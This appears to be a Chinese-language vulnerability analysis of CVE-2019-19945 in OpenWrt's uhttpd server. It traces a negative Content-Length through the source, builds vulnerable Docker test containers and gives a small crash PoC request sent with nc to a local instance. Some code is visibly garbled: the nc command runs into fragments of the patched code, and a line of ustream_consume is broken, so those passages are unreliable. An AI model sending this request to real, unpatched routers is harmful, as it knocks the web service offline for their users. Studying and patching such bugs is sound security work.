@@ -1,0 +1,168 @@
+## 概述
+`OpenWrt/LEDE`是一个为嵌入式设备（通常是无线路由器）开发的高扩展度的`GNU/Linux`发行版。与许多其他路由器的发行版不同，`OpenWrt`是一个完全为嵌入式设备构建的功能全面、易于修改的由现代`Linux`内核驱动的操作系统。`OpenWrt`不是一个单一且不可更改的固件，而是提供了一个完全可写的文件系统及软件包管理。这使您可以不使用供应商提供的应用程序选择和配置，而是通过使用软件包来定制设备以适应任何应用程序。
+`uhttpd`是`OpenWrt`上默认使用的、轻量级的响应`http`申请的`web`服务器。
+[`CVE-2019-19945`](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19945)可能导致对堆缓冲区越界访问，进而导致崩溃。
+在真实测试中，发现本漏洞影响范围与官方描述略有不符，实测发现影响范围为`Openwrt`的`18.06.4`及之前版本，在`18.06.5`版本修复。
+## 获取源码
+根据官方commit信息，可使用以下地址下载一份含漏洞的源码版本和一份不带漏洞版本的源码
+[带漏洞版本uhttpd源码下载链接](https://git.openwrt.org/?p=project/uhttpd.git;a=snapshot;h=6b03f9605323df23d12e3876feb466f53f8d50c4;sf=tgz)
+[不带漏洞版本uhttpd源码下载链接](https://git.openwrt.org/?p=project/uhttpd.git;a=snapshot;h=5f9ae5738372aaa3a6be2f0a278933563d3f191a;sf=tgz)
+## 漏洞分析
+根据官方泄漏的[信息](https://openwrt.org/advisory/2020-01-13-1),漏洞存在于`client.c`中。
+这个漏洞的分析可以从`client.c`中的`uh_client_read_cb`函数开始分析
+    static read_cb_t read_cbs[] = {
+        [CLIENT_STATE_INIT] = client_init_cb,
+        [CLIENT_STATE_HEADER] = client_header_cb,
+        [CLIENT_STATE_DATA] = client_data_cb,
+    };
+    void uh_client_read_cb(struct client *cl)
+    {
+        .......
+            str = ustream_get_read_buf(us, &len);
+        .......
+            if (!read_cbs[cl->state](cl, str, len)) {
+        .......
+    }
+使用`ustream_get_read_buf`获取用户提交的web数据后，根据数据的类型从`read_cbs` 中选取不同数据处理函数来处理。
+其实每个包都会依次调用`client_init_cb`,`client_header_cb`,`client_data_cb`来进行处理，分别是针对请求数据的`request
+line`,`header`头部以及`data`数据段进行处理。
+其中`client_init_cb`是对`request line`进行处理，取出 `URL`等具体信息，此处我们不关注。
+我们首先据头的处理函数`client_header_cb`
+    static bool client_header_cb(struct client *cl, char *buf, int len)
+    {
+        ......
+        client_parse_header(cl, buf);
+        ......
+    }
+`client_header_cb`会调用`client_parse_header`这个函数来进一步处理,获取`header`中的`content-length`,`user-agent`等信息
+    static void client_parse_header(struct client *cl, char *data)
+    {
+        struct http_request *r = &cl->request;
+        char *err;
+        char *name;
+        char *val;
+        ......
+        } else if (!strcmp(data, "content-length")) {
+            r->content_length = strtoul(val, &err, 0);
+            if (err && *err) {
+                uh_header_error(cl, 400, "Bad Request");
+                return;
+            }   
+        ......
+        blobmsg_add_string(&cl->hdr, data, val);
+        cl->state = CLIENT_STATE_HEADER;
+    }
+需要注意的是，此处从`header`中取`content-length`的过程，通过`strtoul`取出来的一个无符号长整型，然后赋值给`r->content_length`,此处`r->content_length`的类型参考数据结构`http_request`
+    struct http_request {
+        enum http_method method;
+        enum http_version version;
+        enum http_user_agent ua;
+        int redirect_status;
+        int content_length;
+        bool expect_cont;
+        bool connection_close;
+        bool disable_chunked;
+        uint8_t transfer_chunked;
+        const struct auth_realm *realm;
+    };
+其中`content_length` 的数据类型是`int`,此处在数据格式由无符号长整型转为整型时存在问题，有可能最终获得`content-length`为负数。我们需要记住此处，然后继续向下分析
+直到针对数据段进行处理的函数`client_data_cb`
+    static bool client_data_cb(struct client *cl, char *buf, int len)
+    {
+        client_poll_post_data(cl);
+        return false;
+    }
+继续向下追溯`client_poll_post_data`
+    void client_poll_post_data(struct client *cl)
+    {
+        ......
+        while (1) {
+            ......
+            buf = ustream_get_read_buf(cl->us, &len);
+            ......
+            cur_len = min(r->content_length, len);
+            if (cur_len) {
+                if (d->data_blocked)
+                    break;
+                if (d->data_send)
+                    cur_len = d->data_send(cl, buf, cur_len);
+                r->content_length -= cur_len;
+                ustream_consume(cl->us, cur_len);
+                continue;
+            }
+            if (!r->transfer_chunked)
+                break;
+            if (r->transfer_chunked > 1)
+                offset = 2;
+            sep = strstr(buf + offset, "\r\n");
+            ......
+    }
+当`r->content_length`为负数时，`cur_len`被赋值为`r->content_length`
+然后被传递给函数`ustream_consume`
+    void ustream_consume(struct ustream *s, int len)
+    {
+        ......
+        do {
+            struct ustream_buf *next = buf->next;
+            int buf_len = buf->tail - buf->data;
+            if (len data += len;
+                break;
+            }
+            len -= buf_len;
+            ustream_free_buf(&s->r, buf);
+            buf = next;
+        } while(len);
+        ......
+    }
+由于传入的`len`为负数，所以`buf->data`有可能被置为负数，回到函数`client_poll_post_data`后继续运行至下一次迭代，首先会调用函数`ustream_get_read_buf`
+    char *ustream_get_read_buf(struct ustream *s, int *buflen)
+    {
+        char *data = NULL;
+        int len = 0;
+        if (s->r.head) {
+            len = s->r.head->tail - s->r.head->data;
+            if (len > 0)
+                data = s->r.head->data;
+        }
+        if (buflen)
+            *buflen = len;
+        return data;
+    }
+由于前期操作`s->r.head->data`被置为负数，因此此处返回值`data`有可能为负数
+再回到函数`client_poll_post_data`, `if`条件均可构造条件绕过，当运行至 `sep = strstr(buf + offset,
+"\r\n");`这一行时，`buf + offset` 有可能为负数，把这个负数作为指针来进行索引时，便会造成崩溃。
+## 环境测试
+据[官方公告](https://openwrt.org/advisory/2020-01-13-1),
+`18.06.5`及之前版本受影响，`18.06.6`版本修复。但是在我的实际测试中，发现是`18.06.4`版本及之前受影响，`18.06.5`版本修复。
+因此在本文分析中，基于`18.06.4`和`18.06.5`开展测试。
+`openwrt`官方提供编译好的文件系统下载，使用`docker`获取`18.06.4`和`18.06.5`镜像：
+    sudo docker import  https://archive.openwrt.org/releases/18.06.4/targets/x86/generic/openwrt-18.06.4-x86-generic-generic-rootfs.tar.gz openwrt-x86-generic-18.06.4-rootfsq
+    sudo docker import  https://archive.openwrt.org/releases/18.06.5/targets/x86/generic/openwrt-18.06.5-x86-generic-generic-rootfs.tar.gz openwrt-x86-generic-18.06.5-rootfsq
+使用`docker`创建`18.06.4`容器：
+    sudo docker run -it --privileged -p 8001:8001 openwrt-x86-generic-18.06.4-rootfsq /bin/ash
+搭建`uhttpd`测试环境：
+    / # mkdir webroot
+    / # mkdir webroot
+    / # rm -rf webroot/
+    / # mkdir /webroot
+    / # mkdir /webroot/URLprefix
+    / # touch /webroot/URLprefix/webfile
+    / # chmod +x /webroot/URLprefix/webfile
+    / # uhttpd -f -p 0.0.0.0:8001 -x /URLprefix -h /webroot
+查看`crash.poc`
+    / # cat crash.poc
+    POST /cgi-bin/luci HTTP/1.0
+    Transfer-Encoding: chunked
+    Content-Length: -100000
+在`docker`宿主机发送`poc`
+    nc 127.0.0.1 8001                if ((err && *err) || r->content_length                if ((sep && *sep) || r->content_length content_length content_length = 0;
+                r->transfer_chunked = 0;
+                break;
+            }
+            ......
+    }
+修补方式是直接检测用户提交的`content_length`参数是否小于0,因而避免了后续的问题。
+## 总结
+漏洞挖掘过程中，不同数据类型的赋值转换过程也是一个值得关注的点。
+另外在实际的环境测试中，考虑到编译复杂，所以计划使用官方编译好的文件系统来进行测试，刚好`openwrt`提供文件系统以及内核[下载](https://archive.openwrt.org/releases/)，最开始尝试使用`binwalk`解开固件包，使用`chroot`的方式运行起来`uhttpd`，但是一直报一个莫名其妙的错误，导致`uhttpd`无法成功运行；然后考虑到既然提供了文件系统和内核，所以计划使用`qemu`来运行，但是在测试中也没有成功运行起来，推断应该是在`openwrt`启动过程中没有找到诸多硬件依赖的问题；最后偶然在网上看到了`docker`的方式，最开始使用了`dockerhub`中的镜像，也没有成功运行，问题也是出在找不到一些硬件依赖无法启动，最后采用了文中的方法，测试起来确实省时省力的。
+这个漏洞的效果基本上还是崩溃，调试成`RCE`之类还是不太现实的，但是在调试过程还是比较耐人寻味的，也对`uhttpd`框架更熟悉了一些。
